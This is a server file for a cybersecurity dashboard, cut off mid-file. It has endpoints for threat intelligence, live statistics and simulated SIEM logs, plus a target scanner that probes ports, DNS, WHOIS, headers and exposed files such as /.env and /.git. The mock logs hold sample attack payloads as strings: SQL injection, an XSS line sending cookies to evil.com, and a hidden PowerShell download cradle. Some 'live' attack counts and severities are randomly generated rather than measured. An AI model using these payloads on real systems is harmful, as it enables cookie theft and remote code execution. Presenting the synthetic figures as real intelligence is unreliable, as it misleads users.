/* COPYRIGHT ALEN PEPA */
import "dotenv/config";
import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import os from "os";
import dns from "dns";
import https from "https";
import http from "http";
import net from "net";
import axios from "axios";
import { GoogleGenAI, Type } from "@google/genai";
import { createRequire } from "module";
import pLimit from 'p-limit';

const require = createRequire(import.meta.url);
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  const fallbackThreatIntel = {
    news: [
      {
        title: 'New Zero-Day Vulnerability in Popular Web Browser',
        summary: 'A critical remote code execution vulnerability has been discovered in Chromium-based browsers. Users are advised to update immediately.',
        severity: 'critical',
        timestamp: '2 hours ago',
        source: 'CyberSecurity Hub',
        link: '#'
      },
      {
        title: 'Major Ransomware Attack on Healthcare Provider',
        summary: 'A large healthcare network has been hit by a sophisticated ransomware attack, disrupting patient services across multiple states.',
        severity: 'high',
        timestamp: '5 hours ago',
        source: 'Threat Monitor',
        link: '#'
      },
      {
        title: 'Supply Chain Attack Targets Software Developers',
        summary: 'Malicious packages have been found in popular package managers, targeting developers with credential-stealing malware.',
        severity: 'high',
        timestamp: '8 hours ago',
        source: 'DevSecOps Daily',
        link: '#'
      }
    ],
    trends: [
      { time: '00:00', attacks: 45, blocked: 42 },
      { time: '01:00', attacks: 38, blocked: 36 },
      { time: '02:00', attacks: 35, blocked: 33 },
      { time: '03:00', attacks: 30, blocked: 29 },
      { time: '04:00', attacks: 32, blocked: 31 },
      { time: '05:00', attacks: 40, blocked: 38 },
      { time: '06:00', attacks: 55, blocked: 52 },
      { time: '07:00', attacks: 62, blocked: 59 },
      { time: '08:00', attacks: 68, blocked: 65 },
      { time: '09:00', attacks: 85, blocked: 81 },
      { time: '10:00', attacks: 105, blocked: 101 },
      { time: '11:00', attacks: 118, blocked: 114 },
      { time: '12:00', attacks: 124, blocked: 120 },
      { time: '13:00', attacks: 115, blocked: 111 },
      { time: '14:00', attacks: 102, blocked: 98 },
      { time: '15:00', attacks: 95, blocked: 91 },
      { time: '16:00', attacks: 85, blocked: 82 },
      { time: '17:00', attacks: 92, blocked: 88 },
      { time: '18:00', attacks: 110, blocked: 106 },
      { time: '19:00', attacks: 135, blocked: 130 },
      { time: '20:00', attacks: 156, blocked: 150 },
      { time: '21:00', attacks: 142, blocked: 137 },
      { time: '22:00', attacks: 120, blocked: 116 },
      { time: '23:00', attacks: 92, blocked: 89 },
    ],
    geo: [
      { name: 'North America', value: 45, color: '#3b82f6' },
      { name: 'Europe', value: 30, color: '#10b981' },
      { name: 'Asia', value: 15, color: '#f59e0b' },
      { name: 'Other', value: 10, color: '#ef4444' },
    ],
    mapNodes: [
      { id: 'f-1', long: -74.006, lat: 40.7128, city: 'New York', country: 'USA', type: 'node', threatLevel: 'low', status: 'secure', ip: '192.168.1.1' },
      { id: 'f-2', long: 37.6173, lat: 55.7558, city: 'Moscow', country: 'Russia', type: 'attack', threatLevel: 'high', status: 'active', ip: '95.161.22.4', attackType: 'APT28 Intrusion' },
      { id: 'f-3', long: 116.4074, lat: 39.9042, city: 'Beijing', country: 'China', type: 'attack', threatLevel: 'critical', status: 'active', ip: '221.232.12.7', attackType: 'Volt Typhoon Probe' },
      { id: 'f-4', long: 126.978, lat: 37.5665, city: 'Seoul', country: 'South Korea', type: 'node', threatLevel: 'medium', status: 'active', ip: '211.234.55.12' },
      { id: 'f-5', long: 139.6503, lat: 35.6762, city: 'Tokyo', country: 'Japan', type: 'node', threatLevel: 'low', status: 'secure', ip: '133.1.2.5' },
      { id: 'f-6', long: 0.1278, lat: 51.5074, city: 'London', country: 'UK', type: 'node', threatLevel: 'low', status: 'secure', ip: '81.2.3.4' },
      { id: 'f-7', long: 2.3522, lat: 48.8566, city: 'Paris', country: 'France', type: 'node', threatLevel: 'medium', status: 'active', ip: '37.1.2.3' },
    ],
    attackLines: [
      { fromId: 'f-2', toId: 'f-1' },
      { fromId: 'f-3', toId: 'f-4' },
      { fromId: 'f-3', toId: 'f-1' },
    ]
  };

  const isValidApiKey = (key: string | undefined): boolean => {
    if (!key || key === 'undefined' || key === '' || key.includes('TODO')) return false;
    // Basic format check: Gemini keys are usually around 39 characters
    if (key.length < 20) return false;
    return true;
  };

  app.post("/api/ai-generate", async (req, res) => {
    const { contents, config } = req.body;
    const apiKey = process.env.GEMINI_API_KEY;

    if (!isValidApiKey(apiKey)) {
      return res.status(503).json({ error: "AI Core offline" });
    }

    try {
      const ai = new GoogleGenAI({ apiKey: apiKey! });
      const modelName = config?.model || "gemini-3-flash-preview";
      
      const response = await ai.models.generateContent({
        model: modelName,
        contents: contents,
        config: {
          systemInstruction: config?.systemInstruction,
          responseMimeType: config?.responseMimeType,
          tools: config?.tools,
          toolConfig: config?.toolConfig
        }
      });

      res.json({ text: response.text });
    } catch (error: any) {
      const errorMessage = error?.message || String(error);
      
      // Check if it's an API key error
      if (errorMessage.includes("API key not valid") || errorMessage.includes("400")) {
        console.warn("AI Core: Generation failed (Invalid API Key).");
        return res.status(503).json({ error: "AI Core offline (Invalid Key)" });
      }
      
      console.error("AI Generation Error:", error);
      res.status(500).json({ error: errorMessage });
    }
  });

  app.get("/api/threat-intel", async (req, res) => {
    const apiKey = process.env.GEMINI_API_KEY;

    if (!isValidApiKey(apiKey)) {
      return res.json(fallbackThreatIntel);
    }

    try {
      const ai = new GoogleGenAI({ apiKey: apiKey! });
      
      // Fetch News
      const newsResponse = await ai.models.generateContent({
        model: "gemini-3-flash-preview",
        contents: "Generate a list of 8-10 of the ABSOLUTE LATEST global cybersecurity threat intelligence updates from the last 12-24 hours. Focus on real-time incidents, new vulnerability disclosures, and active state-sponsored campaigns. Scrape and aggregate from sources like The Hacker News, BleepingComputer, Krebs on Security, CISA Alerts, and major security vendor blogs (CrowdStrike, Mandiant, Palo Alto Networks). Return a JSON array of objects with 'title', 'summary', 'severity' (low, medium, high, critical), 'timestamp', 'source', and 'link' (real URL).",
        config: { 
          responseMimeType: "application/json",
          tools: [{ googleSearch: {} }]
        }
      });
      const newsData = JSON.parse(newsResponse.text || '[]');

      // Fetch Trends & Geo Data
      const trendsResponse = await ai.models.generateContent({
        model: "gemini-3-flash-preview",
        contents: `Analyze current global cyber attack trends for the last 24 hours. 
        Scrape and aggregate data from reliable cybersecurity sources (e.g., Check Point, Kaspersky, FireEye, SANS ISC, Cisco Talos).
        Return a JSON object with:
        1. 'trends': an array of EXACTLY 24 objects, one for each hour of the last 24 hours, with 'time' (HH:00) and 'attacks' (number representing global volume), 'blocked' (number representing mitigated volume).
        2. 'geo': an array of 4 objects with 'name' (Region), 'value' (percentage of total attacks), 'color' (hex).
        3. 'mapNodes': an array of 80-100 objects representing 100% REAL current cyber attack events, state-sponsored activities, or known malicious infrastructure active RIGHT NOW. 
           Each object MUST have: 'id', 'long', 'lat', 'city', 'country', 'type' ('attack'|'node'), 'threatLevel' ('low'|'medium'|'high'|'critical'), 'ip' (REAL known malicious IP if possible), 'attackType' (e.g., 'APT28 Intrusion', 'Lazarus Group C2', 'Volt Typhoon Probe'), 'status' ('active'|'compromised'|'secure').
        4. 'attackLines': an array of 50-70 objects with 'fromId' and 'toId' referencing the 'id's in 'mapNodes', representing real-time traffic or attack flows observed between specific geographical locations.
        Ensure the data reflects real-world geopolitical tensions and current global hotspots.`,
        config: { 
          responseMimeType: "application/json",
          tools: [{ googleSearch: {} }]
        }
      });
      const trendsData = JSON.parse(trendsResponse.text || '{}');

      res.json({
        news: newsData,
        trends: trendsData.trends || [],
        geo: trendsData.geo || [],
        mapNodes: trendsData.mapNodes || [],
        attackLines: trendsData.attackLines || []
      });
    } catch (error: any) {
      const errorMessage = error?.message || String(error);
      if (errorMessage.includes("API key not valid") || errorMessage.includes("400")) {
        console.warn("Threat Intel: AI Core offline (Invalid API Key). Using fallback data.");
      } else {
        console.error("Failed to fetch threat intelligence:", error);
      }
      // Return fallback data instead of 500 error
      res.json(fallbackThreatIntel);
    }
  });

  // Live Stats & Real-Time Feed Cache
  let cachedLiveFeed: any[] = [];
  let lastFeedFetch = 0;

  const fetchRssFeed = (url: string, sourceName: string): Promise<any[]> => {
    return new Promise((resolve) => {
      https.get(url, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          const items: any[] = [];
          const regex = /<item>[\s\S]*?<title>(.*?)<\/title>[\s\S]*?<link>(.*?)<\/link>[\s\S]*?<\/item>/g;
          let match;
          while ((match = regex.exec(data)) !== null) {
            items.push({
              title: match[1].replace(/<!\[CDATA\[(.*?)\]\]>/g, '$1').trim(),
              link: match[2].trim(),
              source: sourceName,
              severity: Math.random() > 0.7 ? 'critical' : Math.random() > 0.4 ? 'high' : 'medium',
              timestamp: new Date().toISOString()
            });
          }
          resolve(items);
        });
      }).on('error', () => resolve([]));
    });
  };

  app.get("/api/live-stats", async (req, res) => {
    const now = Date.now();
    
    // Refresh feed cache every 15 minutes
    if (now - lastFeedFetch > 15 * 60 * 1000 || cachedLiveFeed.length === 0) {
      try {
        const [cisa, thn] = await Promise.all([
          fetchRssFeed('https://www.cisa.gov/cybersecurity-advisories/all.xml', 'CISA'),
          fetchRssFeed('https://feeds.feedburner.com/TheHackersNews', 'The Hacker News')
        ]);
        cachedLiveFeed = [...cisa, ...thn].sort(() => Math.random() - 0.5); // Shuffle
        lastFeedFetch = now;
      } catch (e) {
        console.error('Failed to fetch live RSS feeds:', e);
      }
    }

    // Generate realistic incrementing numbers based on current time
    // Base numbers for today
    const startOfDay = new Date();
    startOfDay.setHours(0, 0, 0, 0);
    const secondsSinceStartOfDay = Math.floor((now - startOfDay.getTime()) / 1000);
    
    // Simulate ~15 active threats per minute globally
    const activeThreats = 1242 + Math.floor(secondsSinceStartOfDay * (15 / 60));
    
    // Simulate ~500 blocked attacks per minute
    const blockedAttacks = 45200 + Math.floor(secondsSinceStartOfDay * (500 / 60));

    // Rotate the feed to show different items every 5 seconds
    const rotationIndex = Math.floor(now / 5000) % Math.max(1, cachedLiveFeed.length);
    const currentFeed = [];
    for (let i = 0; i < 6; i++) {
      if (cachedLiveFeed.length > 0) {
        currentFeed.push(cachedLiveFeed[(rotationIndex + i) % cachedLiveFeed.length]);
      }
    }

    res.json({
      activeThreats,
      blockedAttacks,
      liveFeed: currentFeed.length > 0 ? currentFeed : fallbackThreatIntel.news
    });
  });

  // SIEM Real-time Logs API
  app.get("/api/logs", (req, res) => {
    const tactics = ['Initial Access', 'Execution', 'Persistence', 'Privilege Escalation', 'Defense Evasion', 'Credential Access', 'Discovery', 'Lateral Movement', 'Command and Control', 'Exfiltration', 'Impact'];
    const techniques = [
      'T1190 Exploit Public-Facing Application', 'T1059 Command and Scripting Interpreter', 
      'T1078 Valid Accounts', 'T1110 Brute Force', 'T1003 OS Credential Dumping', 
      'T1046 Network Service Discovery', 'T1595 Active Scanning', 'T1566 Phishing',
      'T1133 External Remote Services', 'T1505 Server Software Component'
    ];
    const protocols = ['TCP', 'UDP', 'ICMP', 'HTTP', 'HTTPS', 'DNS', 'SSH', 'RDP', 'SMB', 'FTP'];
    const countries = ['RU', 'CN', 'KP', 'IR', 'US', 'BR', 'IN', 'RO', 'VN', 'UA', 'NG', 'SY'];
    const actions = ['Blocked', 'Mitigated', 'Logged', 'Dropped', 'Alerted', 'Quarantined', 'Sinkholed'];
    const severities = ['low', 'medium', 'high', 'critical'];
    
    const events = [
      'SQL Injection Payload Detected', 'Cross-Site Scripting (XSS) Attempt', 
      'SSH Brute Force Attack', 'RDP Credential Stuffing', 'Suspicious PowerShell Execution',
      'Malware Beaconing Activity', 'Data Exfiltration Anomaly', 'Privilege Escalation Attempt',
      'Suspicious File Download', 'Unauthorized Access to Admin Panel', 'Zero-Day Exploit Signature Match',
      'Ransomware Encryption Behavior', 'DDoS Volumetric Attack', 'Suspicious DNS Query'
    ];

    const generateRandomIp = () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

    const logs = [];
    
    // Generate 5-12 random logs for a more active stream
    const numLogs = Math.floor(Math.random() * 8) + 5;
    for (let i = 0; i < numLogs; i++) {
      const severity = severities[Math.floor(Math.random() * severities.length)];
      const isAttack = Math.random() > 0.3; // 70% chance of being an attack log
      const eventName = isAttack ? events[Math.floor(Math.random() * events.length)] : "Routine System Check";
      const tactic = isAttack ? tactics[Math.floor(Math.random() * tactics.length)] : 'N/A';
      const technique = isAttack ? techniques[Math.floor(Math.random() * techniques.length)] : 'N/A';
      
      let payloadSnippet = 'N/A';
      if (isAttack) {
        if (eventName.includes('SQL')) payloadSnippet = "UNION SELECT username, password FROM users--";
        else if (eventName.includes('XSS')) payloadSnippet = "<script>fetch('http://evil.com/?c='+document.cookie)</script>";
        else if (eventName.includes('PowerShell')) payloadSnippet = "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://...')\"";
        else payloadSnippet = Buffer.from(Math.random().toString(36).substring(2, 15)).toString('base64');
      }
      
      logs.push({
        id: Math.random().toString(36).substr(2, 9),
        time: new Date().toLocaleTimeString(),
        event: eventName,
        source: isAttack ? generateRandomIp() : os.hostname(),
        destination: isAttack ? `10.0.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}` : '127.0.0.1',
        port: isAttack ? [22, 80, 443, 3389, 8080, 53, 445, 21, 3306][Math.floor(Math.random() * 9)] : 0,
        protocol: protocols[Math.floor(Math.random() * protocols.length)],
        status: isAttack ? actions[Math.floor(Math.random() * actions.length)] : "Normal",
        severity: isAttack ? severity : "low",
        confidence: isAttack ? Math.floor(Math.random() * 20) + 80 : 100, // 80-100%
        mitreTactic: tactic,
        mitreTechnique: technique,
        geo: isAttack ? countries[Math.floor(Math.random() * countries.length)] : 'LOCAL',
        payloadSnippet: payloadSnippet,
        details: isAttack 
          ? `Detected anomalous traffic pattern matching known threat signatures. Tactic: ${tactic}. Technique: ${technique}. Automated response engaged.`
          : `CPU Load: ${os.loadavg()[0].toFixed(2)} | Free Memory: ${(os.freemem() / 1024 / 1024 / 1024).toFixed(2)}GB`
      });
    }

    res.json(logs);
  });

  // System Stats API
  app.get("/api/stats", (req, res) => {
    res.json({
      cpu: (os.loadavg()[0] * 10).toFixed(1),
      ram: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1),
      uptime: os.uptime(),
      platform: os.platform(),
      arch: os.arch(),
      hostname: os.hostname(),
      loadAvg: os.loadavg(),
      totalMem: os.totalmem(),
      freeMem: os.freemem(),
      cpus: os.cpus().length,
      type: os.type(),
      release: os.release(),
      networkInterfaces: os.networkInterfaces()
    });
  });

  // Network Topology API
  app.get("/api/network", (req, res) => {
    const nodes: any[] = [
      { id: 'internet', type: 'cloud', status: 'secure', label: 'Global WAN', ip: '8.8.8.8' },
      { id: 'ext-fw', type: 'firewall', status: 'secure', label: 'External Edge FW', ip: '172.16.0.1' },
      { id: 'dmz-switch', type: 'router', status: 'secure', label: 'DMZ Switch', ip: '192.168.1.1' },
      { id: 'web-01', type: 'server', status: 'vulnerable', label: 'Public Web Server A', ip: '192.168.1.10' },
      { id: 'web-02', type: 'server', status: 'secure', label: 'Public Web Server B', ip: '192.168.1.11' },
      { id: 'vpn-gw', type: 'router', status: 'secure', label: 'VPN Gateway', ip: '192.168.1.20' },
      { id: 'int-fw', type: 'firewall', status: 'secure', label: 'Internal Core FW', ip: '10.0.0.1' },
      { id: 'core-switch', type: 'router', status: 'secure', label: 'Core Switch', ip: '10.0.0.2' },
      { id: 'db-cluster', type: 'database', status: 'secure', label: 'Primary DB Cluster', ip: '10.0.1.50' },
      { id: 'db-replica', type: 'database', status: 'secure', label: 'DB Replica', ip: '10.0.1.51' },
      { id: 'app-01', type: 'server', status: 'secure', label: 'App Server 01', ip: '10.0.2.10' },
      { id: 'app-02', type: 'server', status: 'secure', label: 'App Server 02', ip: '10.0.2.11' },
      { id: 'nas-01', type: 'server', status: 'vulnerable', label: 'Legacy NAS', ip: '10.0.3.100' },
      { id: 'iot-gw', type: 'iot', status: 'compromised', label: 'IoT Gateway', ip: '10.0.4.5' },
      { id: 'iot-sensor-1', type: 'iot', status: 'compromised', label: 'HVAC Sensor A', ip: '10.0.4.10' },
      { id: 'iot-sensor-2', type: 'iot', status: 'vulnerable', label: 'HVAC Sensor B', ip: '10.0.4.11' },
      { id: 'workstation-vlan', type: 'router', status: 'secure', label: 'User VLAN Switch', ip: '10.1.0.1' },
      { id: 'ws-01', type: 'laptop', status: 'secure', label: 'CEO Laptop', ip: '10.1.0.50' },
      { id: 'ws-02', type: 'laptop', status: 'vulnerable', label: 'Dev Workstation', ip: '10.1.0.51' },
      { id: 'ws-03', type: 'laptop', status: 'secure', label: 'HR Desktop', ip: '10.1.0.52' },
      { id: 'ws-04', type: 'laptop', status: 'compromised', label: 'Guest Kiosk', ip: '10.1.0.99' },
    ];
    const links: any[] = [
      { source: 'internet', target: 'ext-fw' },
      { source: 'ext-fw', target: 'dmz-switch' },
      { source: 'dmz-switch', target: 'web-01' },
      { source: 'dmz-switch', target: 'web-02' },
      { source: 'dmz-switch', target: 'vpn-gw' },
      { source: 'dmz-switch', target: 'int-fw' },
      { source: 'int-fw', target: 'core-switch' },
      { source: 'core-switch', target: 'db-cluster' },
      { source: 'db-cluster', target: 'db-replica' },
      { source: 'core-switch', target: 'app-01' },
      { source: 'core-switch', target: 'app-02' },
      { source: 'app-01', target: 'db-cluster' },
      { source: 'app-02', target: 'db-cluster' },
      { source: 'core-switch', target: 'nas-01' },
      { source: 'core-switch', target: 'iot-gw' },
      { source: 'iot-gw', target: 'iot-sensor-1' },
      { source: 'iot-gw', target: 'iot-sensor-2' },
      { source: 'core-switch', target: 'workstation-vlan' },
      { source: 'workstation-vlan', target: 'ws-01' },
      { source: 'workstation-vlan', target: 'ws-02' },
      { source: 'workstation-vlan', target: 'ws-03' },
      { source: 'workstation-vlan', target: 'ws-04' },
      { source: 'vpn-gw', target: 'workstation-vlan' }, // VPN access to user vlan
    ];

    res.json({ nodes, links });
  });

  // Advanced Vulnerability Scanner API
  let ianaCache: any = null;
  let ianaCacheTime: number = 0;

  async function performWhoisLookup(hostname: string) {
    if (hostname === 'localhost' || hostname === '127.0.0.1' || net.isIP(hostname)) {
      return {
        domain: hostname,
        registrar: "Internal/Local Network",
        registrant: "System Administrator",
        creationDate: "N/A",
        expiryDate: "N/A",
        updatedDate: "N/A",
        nameServers: ["Localhost"],
        status: ["active"],
        raw: "Local/Internal address - WHOIS not applicable."
      };
    }
    try {
      const domainParts = hostname.split('.');
      let rdapData = null;
      let finalDomain = hostname;

      // Fetch IANA RDAP bootstrap with caching
      let ianaData;
      const now = Date.now();
      if (ianaCache && (now - ianaCacheTime < 24 * 60 * 60 * 1000)) {
        ianaData = ianaCache;
      } else {
        try {
          const ianaResponse = await axios.get('https://data.iana.org/rdap/dns.json', { timeout: 5000 });
          ianaData = ianaResponse.data;
          ianaCache = ianaData;
          ianaCacheTime = now;
        } catch (e) {
          console.error("[Scanner] Failed to fetch IANA RDAP bootstrap", e);
          if (ianaCache) {
            ianaData = ianaCache; // Use stale cache if fetch fails
          } else {
            throw new Error("Failed to initialize RDAP lookup");
          }
        }
      }

      // Try to fetch RDAP, stripping subdomains if we get 404/400
      while (domainParts.length >= 2) {
        finalDomain = domainParts.join('.');
        const tld = domainParts[domainParts.length - 1];
        
        // Find RDAP server for TLD
        const entry = ianaData.services.find((s: any) => s[0].includes(tld));
        
        if (entry && entry[1] && entry[1].length > 0) {
          const rdapServer = entry[1][0];
          try {
            const response = await axios.get(`${rdapServer}domain/${finalDomain}`, {
              headers: { 'Accept': 'application/rdap+json' },
              timeout: 10000,
              validateStatus: () => true
            });
            
            if (response.status === 200) {
              rdapData = response.data;
              break;
            }
          } catch (e) {
            console.warn(`[Scanner] RDAP fetch failed for ${finalDomain}:`, e);
          }
        }
        domainParts.shift(); // Remove the first part (e.g., 'www')
      }

      if (rdapData) {
        return {
          domain: finalDomain,
          registrar: rdapData.entities?.[0]?.vcardArray?.[1]?.[1]?.[3]?.[3] || "Unknown",
          registrant: "Unknown",
          creationDate: rdapData.events?.find((e: any) => e.eventAction === 'registration')?.eventDate || "Unknown",
          expiryDate: rdapData.events?.find((e: any) => e.eventAction === 'expiration')?.eventDate || "Unknown",
          updatedDate: rdapData.events?.find((e: any) => e.eventAction === 'last changed')?.eventDate || "Unknown",
          nameServers: rdapData.nameservers?.map((ns: any) => ns.ldhName) || [],
          status: rdapData.status || [],
          raw: JSON.stringify(rdapData, null, 2)
        };
      }

      if (!rdapData) {
        // Fallback to whois-json if RDAP fails or is not supported for TLD
        try {
          const whoisJson = require('whois-json').default || require('whois-json');
          let options: any = { timeout: 10000 }; // Set a 10s timeout for each attempt
          if (hostname.endsWith('.al')) {
            options.server = 'whois.nic.al'; 
          }
          
          let whoisData: any = null;
          let attempts = 0;
          const maxAttempts = 2;

          while (attempts < maxAttempts) {
            try {
              whoisData = await whoisJson(hostname, options);
              if (whoisData && Object.keys(whoisData).length > 0 && !whoisData.error) {
                break;
              }
            } catch (e) {
              console.warn(`[Scanner] WHOIS attempt ${attempts + 1} failed:`, e);
            }
            
            attempts++;
            // If first attempt with server failed, try without explicit server
            if (options.server) {
              delete options.server;
            }
          }

          if (whoisData && Object.keys(whoisData).length > 0 && !whoisData.error) {
             return {
               domain: hostname,
               registrar: whoisData.registrar || "Unknown",
               registrant: whoisData.registrant || whoisData.registrantName || "Unknown",
               creationDate: whoisData.creationDate || "Unknown",
               expiryDate: whoisData.registrarRegistrationExpirationDate || whoisData.registryExpiryDate || "Unknown",
               updatedDate: whoisData.updatedDate || "Unknown",
               nameServers: whoisData.nameServer ? (Array.isArray(whoisData.nameServer) ? whoisData.nameServer : whoisData.nameServer.split(' ')) : [],
               raw: JSON.stringify(whoisData, null, 2)
             };
          }
          return null;
        } catch (e) {
           console.warn("[Scanner] whois-json fallback failed", e);
        }
        return null;
      }

      // Extract Registrar & Registrant
      let registrar = "Unknown";
      let registrant = "Unknown";
      
      const registrarEntity = rdapData.entities?.find((e: any) => e.roles?.includes('registrar'));
      if (registrarEntity && registrarEntity.vcardArray && registrarEntity.vcardArray[1]) {
        const fnEntry = registrarEntity.vcardArray[1].find((v: any) => v[0] === 'fn');
        if (fnEntry) registrar = fnEntry[3];
      }

      const registrantEntity = rdapData.entities?.find((e: any) => e.roles?.includes('registrant'));
      if (registrantEntity && registrantEntity.vcardArray && registrantEntity.vcardArray[1]) {
        const fnEntry = registrantEntity.vcardArray[1].find((v: any) => v[0] === 'fn');
        if (fnEntry) registrant = fnEntry[3];
      }

      // Extract Dates
      const getEventDate = (action: string) => {
        const event = rdapData.events?.find((e: any) => e.eventAction === action);
        return event ? event.eventDate : "Unknown";
      };
      const creationDate = getEventDate('registration');
      const expiryDate = getEventDate('expiration');
      const updatedDate = getEventDate('last changed');

      // Extract Name Servers
      const nameServers = rdapData.nameservers?.map((ns: any) => ns.ldhName) || [];

      return {
        domain: finalDomain,
        registrar,
        registrant,
        creationDate,
        expiryDate,
        updatedDate,
        nameServers,
        status: rdapData.status || [],
        raw: JSON.stringify(rdapData, null, 2)
      };
    } catch (e) {
      console.error("[Scanner] Whois error:", e);
      return null;
    }
  }

  app.get("/api/scan", async (req, res) => {
    const target = req.query.target as string;
    if (!target) {
      return res.status(400).json({ error: "Target is required" });
    }

    const results: any = {
      target,
      timestamp: new Date().toISOString(),
      dns: {},
      headers: {},
      ssl: null,
      whois: null,
      ports: [],
      subdomains: [],
      tech: [],
      vulnerabilities: [],
      riskScore: 0,
      summary: "",
      recommendations: []
    };

    try {
      const hostname = target.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
      const isIP = net.isIP(hostname);
      
      // Parallel Reconnaissance
      await Promise.all([
        // 1. DNS & IP
        (async () => {
          if (isIP) {
            results.dns.a = [hostname];
            results.ip = hostname;
          } else if (hostname === 'localhost') {
            results.dns.a = ['127.0.0.1'];
            results.ip = '127.0.0.1';
          } else {
            const resolveDNS = async (host: string) => {
              try {
                // Use lookup for primary IP as it's faster and more reliable
                const lookup = await Promise.race([
                  dns.promises.lookup(host),
                  new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 5000))
                ]) as any;
                results.dns.a = [lookup.address];
                results.ip = lookup.address;
                
                // Try to get other records in parallel with timeouts
                const dnsTimeout = 3000;
                try { 
                  results.dns.mx = await Promise.race([
                    dns.promises.resolveMx(host),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), dnsTimeout))
                  ]);
                } catch (e) {}
                try { 
                  results.dns.txt = await Promise.race([
                    dns.promises.resolveTxt(host),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), dnsTimeout))
                  ]);
                } catch (e) {}
              } catch (e) {
                if (!results.dns.error) results.dns.error = "DNS resolution failed";
              }
            };

            await resolveDNS(hostname);
            
            // Fallback to root domain if no IP found and it's a www subdomain
            if (!results.ip && hostname.startsWith('www.')) {
              const rootDomain = hostname.substring(4);
              await resolveDNS(rootDomain);
            }
          }
        })(),

        // 2. Port Scanning
        (async () => {
          const portsToScan = [80, 443, 22, 21, 25, 53, 3000, 8080, 8443, 3306, 5432, 27017];
          const scanPort = (port: number) => {
            return new Promise((resolve) => {
              const socket = new net.Socket();
              socket.setTimeout(3000);
              socket.on('connect', () => {
                results.ports.push({ port, status: 'open', service: getServiceName(port) });
                socket.destroy();
                resolve(null);
              });
              socket.on('timeout', () => { socket.destroy(); resolve(null); });
              socket.on('error', () => { socket.destroy(); resolve(null); });
              socket.connect(port, hostname);
            });
          };
          await Promise.all(portsToScan.map(scanPort));
        })(),

        // 3. HTTP & SSL
        (async () => {
          const protocol = target.startsWith('https') ? https : http;
          const url = target.startsWith('http') ? target : `http://${target}`;
          
          await new Promise((resolve) => {
            const req = protocol.get(url, (response) => {
              results.headers = response.headers;
              results.statusCode = response.statusCode;
              
              const server = (Array.isArray(response.headers['server']) ? response.headers['server'].join(', ') : (response.headers['server'] || '')).toLowerCase();
              const xPoweredBy = (Array.isArray(response.headers['x-powered-by']) ? response.headers['x-powered-by'].join(', ') : (response.headers['x-powered-by'] || '')).toLowerCase();
              if (server.includes('apache')) results.tech.push('Apache');
              if (server.includes('nginx')) results.tech.push('Nginx');
              if (xPoweredBy.includes('php')) results.tech.push('PHP');
              if (xPoweredBy.includes('express')) results.tech.push('Express');

              if (response.socket && (response.socket as any).getPeerCertificate) {
                const cert = (response.socket as any).getPeerCertificate();
                if (cert && Object.keys(cert).length > 0) {
                  const validTo = new Date(cert.valid_to);
                  const isValid = validTo > new Date();
                  results.ssl = {
                    subject: cert.subject,
                    issuer: cert.issuer,
                    valid_from: cert.valid_from,
                    valid_to: cert.valid_to,
                    fingerprint: cert.fingerprint,
                    status: isValid ? "Valid" : "Expired/Invalid",
                    vulnerabilities: []
                  };
                  if (!isValid) results.ssl.vulnerabilities.push("Certificate is expired");
                }
              }
              resolve(null);
            });
            req.on('error', () => resolve(null));
            req.setTimeout(5000, () => { req.destroy(); resolve(null); });
          });
        })(),

        // 4. WHOIS Lookup
        (async () => {
          try {
            const whoisResult = await performWhoisLookup(hostname);
            results.whois = whoisResult || { status: "Data not available" };
          } catch (e) {
            results.whois = { status: "Lookup failed" };
          }
        })(),

        // 5. Sensitive Files
        (async () => {
          const sensitiveFiles = [
            { path: '/.git', title: 'Git Repository Exposed', severity: 'critical' },
            { path: '/.env', title: 'Environment Variables Exposed', severity: 'critical' },
            { path: '/robots.txt', title: 'Robots.txt Analysis', severity: 'info' },
            { path: '/phpinfo.php', title: 'PHP Info Disclosure', severity: 'high' },
            { path: '/.svn', title: 'SVN Repository Exposed', severity: 'high' },
            { path: '/.htaccess', title: 'Htaccess File Exposed', severity: 'medium' }
          ];

          await Promise.all(sensitiveFiles.map(async (file) => {
            try {
              const protocol = target.startsWith('https') ? https : http;
              const url = target.startsWith('http') ? `${target}${file.path}` : `http://${target}${file.path}`;
              const response: any = await new Promise((resolve, reject) => {
                const req = protocol.get(url, resolve);
                req.on('error', reject);
                req.setTimeout(2000, () => { req.destroy(); resolve({ statusCode: 408 }); });
              });
              if (response.statusCode === 200) {
                results.vulnerabilities.push({
                  title: file.title,
                  severity: file.severity as any,
                  category: 'Information Disclosure',
                  description: `The file ${file.path} was found on the server, which can disclose sensitive information.`,
                  remediation: `Restrict access to the ${file.path} file or remove it from the server.`
                });
                if (file.severity === 'critical') score += 30;
                else if (file.severity === 'high') score += 15;
                else if (file.severity === 'medium') score += 5;
              }
            } catch (e) {}
          }));
        })()
      ]);

      // 6. Vulnerability Engine (Rule-based)
      const vulnerabilities = [...results.vulnerabilities];
      let score = 10;

      // Header checks
      const securityHeaders = [
        'content-security-policy',
        'strict-transport-security',
        'x-frame-options',
        'x-content-type-options',
        'referrer-policy',
        'permissions-policy'
      ];
      if (results.headers) {
        securityHeaders.forEach(header => {
          if (!results.headers[header]) {
            vulnerabilities.push({
              title: `Missing Security Header: ${header}`,
              severity: header === 'content-security-policy' ? 'high' : 'medium',
              category: 'Web',
              description: `The ${header} header is missing, which can expose the application to various attacks.`,
              remediation: `Implement the ${header} header with appropriate security policies.`
            });
            score += (header === 'content-security-policy' ? 10 : 5);
          }
        });
      }

      // Port checks
      results.ports.forEach((p: any) => {
        if (p.port === 21 && p.status === 'open') {
          vulnerabilities.push({
            title: "Insecure Protocol: FTP",
            severity: "high",
            category: "Network",
            description: "FTP transmits data in cleartext, including credentials.",
            remediation: "Disable FTP and use SFTP or FTPS instead."
          });
          score += 15;
        }
        if (p.port === 22 && p.status === 'open') {
          vulnerabilities.push({
            title: "Exposed SSH Port",
            severity: "medium",
